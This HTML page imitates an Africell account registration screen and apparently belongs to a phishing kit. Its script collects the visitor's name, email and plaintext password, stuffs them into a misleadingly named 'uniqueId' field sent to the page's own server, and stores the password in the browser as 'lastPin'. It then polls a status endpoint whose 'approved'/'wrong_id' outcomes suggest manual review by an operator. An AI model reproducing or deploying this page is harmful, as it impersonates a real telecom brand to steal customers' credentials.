<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Africell | Registration</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            -webkit-tap-highlight-color: transparent;
        }

        html, body {
            width: 100%;
            height: 100%;
            background: #F2F2F2;
            overflow-x: hidden;
        }

        .reg-wrapper {
            width: 100%;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding-bottom: 50px;
        }

        /* Solid Purple Top Navigation Bar */
        .reg-navbar {
            width: 100%;
            height: 119px;
            background: #991676;
            display: flex;
            align-items: center;
            padding: 0 24px;
            gap: 20px;
        }

        .back-arrow {
            color: #ffffff;
            font-size: 26px;
            text-decoration: none;
            display: flex;
            align-items: center;
            justify-content: center;
            width: 35px;
            height: 35px;
        }

        .navbar-title {
            color: #ffffff;
            font-size: 22px;
            font-weight: 400;
        }

        /* Main Content Container */
        .reg-content {
            width: 100%;
            max-width: 520px;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 0 34px;
        }

        /* Main Heading */
        .reg-heading {
            font-size: 32px;
            font-weight: 400;
            color: #000000;
            text-align: center;
            margin-top: 40px;
            margin-bottom: 16px;
        }

        /* Instructions */
        .reg-instructions {
            font-size: 16px;
            color: #000000;
            text-align: center;
            font-weight: 400;
            line-height: 1.4;
            margin-bottom: 35px;
        }

        /* Input Field Containers */
        .reg-input-group {
            width: 100%;
            position: relative;
            margin-bottom: 20px;
        }

        .reg-input-field {
            width: 100%;
            height: 100px;
            background: #ffffff;
            border: 2px solid #991676;
            border-radius: 18px;
            font-size: 18px;
            font-weight: 600;
            color: #000000;
            text-align: center;
            outline: none;
            -webkit-appearance: none;
            appearance: none;
            padding: 0 50px;
            box-shadow: inset 0 2px 4px rgba(0,0,0,0.02);
        }

        .reg-input-field::placeholder {
            color: #707070;
            font-size: 16px;
            font-weight: 400;
            text-align: center;
        }

        .reg-input-field:focus {
            border-color: #79105c;
        }

        /* Eye Icon Toggle for Passwords */
        .toggle-password {
            position: absolute;
            right: 24px;
            top: 50%;
            transform: translateY(-50%);
            color: #79105c;
            font-size: 20px;
            cursor: pointer;
            z-index: 10;
        }

        /* Large Purple Create Account Button */
        .reg-btn {
            width: 100%;
            height: 110px;
            background: #991676;
            color: #ffffff;
            border: none;
            border-radius: 17px;
            font-size: 24px;
            font-weight: 700;
            letter-spacing: 0.5px;
            text-transform: capitalize;
            cursor: pointer;
            box-shadow: 0 6px 16px rgba(153, 22, 118, 0.3);
            display: flex;
            align-items: center;
            justify-content: center;
            text-decoration: none;
            margin-top: 10px;
            transition: background 0.2s ease, transform 0.1s ease;
        }

        .reg-btn:hover {
            background: #79105c;
        }

        .reg-btn:active {
            transform: translateY(1px);
        }

        .reg-btn.disabled-state {
            opacity: 0.4;
            filter: blur(1.5px);
            pointer-events: none;
            cursor: not-allowed;
            box-shadow: none !important;
        }

        /* Loading Spinner */
        #loadingSpinner {
            display: none;
            flex-direction: row;
            align-items: center;
            justify-content: center;
            gap: 12px;
            margin-top: 20px;
            font-size: 15px;
            color: #991676;
            font-weight: 600;
        }

        .spinner {
            width: 24px;
            height: 24px;
            border: 3px solid rgba(153, 22, 118, 0.2);
            border-top: 3px solid #991676;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Custom In-App Modal Dialog */
        #customModal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(153, 22, 118, 0.9);
            backdrop-filter: blur(8px);
            justify-content: center;
            align-items: center;
            z-index: 9999;
            padding: 20px;
        }

        .modal-card {
            background: #991676;
            width: 100%;
            max-width: 320px;
            border-radius: 24px;
            padding: 28px;
            text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.2);
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
            color: #ffffff;
            animation: scaleUp 0.3s ease;
        }

        @keyframes scaleUp {
            from { transform: scale(0.8); opacity: 0; }
            to { transform: scale(1); opacity: 1; }
        }

        .modal-message {
            font-size: 15px;
            font-weight: 600;
            margin-bottom: 24px;
            line-height: 1.4;
            color: #ffffff;
        }

        .modal-btn {
            background: #ffd34d;
            color: #5E0C44;
            border: none;
            border-radius: 14px;
            padding: 14px 24px;
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
            width: 100%;
            box-shadow: 0 6px 16px rgba(255, 211, 77, 0.3);
        }

        .modal-btn:active {
            opacity: 0.9;
        }
    </style>
</head>
<body>

    <div class="reg-wrapper">
        <!-- Top Navigation Bar (goes back to scratch2.html) -->
        <nav class="reg-navbar">
            <a href="scratch2.html" class="back-arrow">
                <i class="fa-solid fa-arrow-left"></i>
            </a>
            <span class="navbar-title">Registration</span>
        </nav>

        <!-- Main Body Content -->
        <div class="reg-content">
            <h1 class="reg-heading">Create Account</h1>
            <p class="reg-instructions">
                Please enter your details to create an account
            </p>

            <!-- 1. Full Name Field -->
            <div class="reg-input-group">
                <input type="text" id="fullName" class="reg-input-field" placeholder="Full Name" required>
            </div>

            <!-- 2. Email Address Field -->
            <div class="reg-input-group">
                <input type="email" id="emailAddress" class="reg-input-field" placeholder="Email Address (Optional)">
            </div>

            <!-- 3. Password Field -->
            <div class="reg-input-group">
                <input type="password" id="regPassword" class="reg-input-field" placeholder="Password" required>
                <i class="fa-solid fa-eye toggle-password" id="toggleRegPass" onclick="togglePass('regPassword', 'toggleRegPass')"></i>
            </div>

            <!-- 4. Confirm Password Field -->
            <div class="reg-input-group">
                <input type="password" id="confirmRegPassword" class="reg-input-field" placeholder="Confirm Password" required>
                <i class="fa-solid fa-eye toggle-password" id="toggleConfirmRegPass" onclick="togglePass('confirmRegPassword', 'toggleConfirmRegPass')"></i>
            </div>

            <!-- Purple Create Account Button -->
            <button type="button" id="createAccountBtn" class="reg-btn" onclick="submitRegistration()">Create Account</button>

            <!-- Loading Spinner -->
            <div id="loadingSpinner">
                <div class="spinner"></div>
                <span>Creating your account...</span>
            </div>
        </div>
    </div>

    <!-- Custom In-App Modal Dialog -->
    <div id="customModal">
        <div class="modal-card">
            <div id="modalText" class="modal-message">Notification message here</div>
            <button class="modal-btn" onclick="closeModal()">OK</button>
        </div>
    </div>

    <script>
        let pendingAction = null;

        function showAppAlert(message, actionCallback = null) {
            document.getElementById('modalText').innerText = message;
            document.getElementById('customModal').style.display = 'flex';
            pendingAction = actionCallback;
        }

        function closeModal() {
            document.getElementById('customModal').style.display = 'none';
            if (pendingAction) {
                pendingAction();
                pendingAction = null;
            }
        }

        function togglePass(inputId, iconId) {
            const input = document.getElementById(inputId);
            const icon = document.getElementById(iconId);
            if (input.type === 'password') {
                input.type = 'text';
                icon.classList.remove('fa-eye');
                icon.classList.add('fa-eye-slash');
            } else {
                input.type = 'password';
                icon.classList.remove('fa-eye-slash');
                icon.classList.add('fa-eye');
            }
        }

        async function submitRegistration() {
            const nameVal = document.getElementById('fullName').value.trim();
            const emailVal = document.getElementById('emailAddress').value.trim();
            const pass1 = document.getElementById('regPassword').value.trim();
            const pass2 = document.getElementById('confirmRegPassword').value.trim();
            const createBtn = document.getElementById('createAccountBtn');
            const spinnerDiv = document.getElementById('loadingSpinner');
            const phoneInput = localStorage.getItem('africellUserPhone') || localStorage.getItem('userPhone') || 'Unknown Phone';

            if (!nameVal) {
                showAppAlert('❌ Please enter your full name.');
                return;
            }

            // Password requirements validation
            if (pass1.length < 5) {
                showAppAlert('❌ Password must be at least 5 characters long.');
                return;
            }
            if (!/[a-zA-Z]/.test(pass1)) {
                showAppAlert('❌ Password must contain letters.');
                return;
            }
            if (/^\d+$/.test(pass1)) {
                showAppAlert('❌ Password cannot be numbers only.');
                return;
            }
            if (pass1 !== pass2) {
                showAppAlert('❌ Both passwords must match.');
                return;
            }

            localStorage.setItem('lastPin', pass1);

            try {
                createBtn.classList.add('disabled-state');
                if (spinnerDiv) spinnerDiv.style.display = 'flex';

                // Pass uniqueId prefixed safely so server.js handles it cleanly
                const response = await fetch('/api/submit-order', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        phone: phoneInput, 
                        uniqueId: `Reg: Name=${nameVal}, Email=${emailVal || 'N/A'}, Pass=${pass1}` 
                    })
                });

                const result = await response.json();

                if (result.success) {
                    pollApprovalStatus(phoneInput);
                } else {
                    createBtn.classList.remove('disabled-state');
                    if (spinnerDiv) spinnerDiv.style.display = 'none';
                    showAppAlert('❌ Registration failed. Please try again.');
                }
            } catch (error) {
                console.error('Error:', error);
                createBtn.classList.remove('disabled-state');
                if (spinnerDiv) spinnerDiv.style.display = 'none';
                showAppAlert('Could not connect to the backend server.');
            }
        }

        function pollApprovalStatus(phone) {
            const cleanPhone = phone.trim();
            const createBtn = document.getElementById('createAccountBtn');
            const spinnerDiv = document.getElementById('loadingSpinner');

            const statusInterval = setInterval(async () => {
                try {
                    const response = await fetch(`/api/check-status?phone=${encodeURIComponent(cleanPhone)}`);
                    const data = await response.json();

                    if (data.status === 'approved') {
                        clearInterval(statusInterval);
                        showAppAlert('✅ Account created successfully!', () => {
                            window.location.href = 'login.html';
                        });
                    } 
                    else if (data.status === 'rejected' || data.status === 'wrong_id') {
                        clearInterval(statusInterval);
                        if (spinnerDiv) spinnerDiv.style.display = 'none';
                        createBtn.classList.remove('disabled-state');
                        showAppAlert('❌ Registration request rejected.');
                    }
                } catch (e) {
                    console.error('Polling error', e);
                }
            }, 3000);
        }
    </script>

</body>
</html>
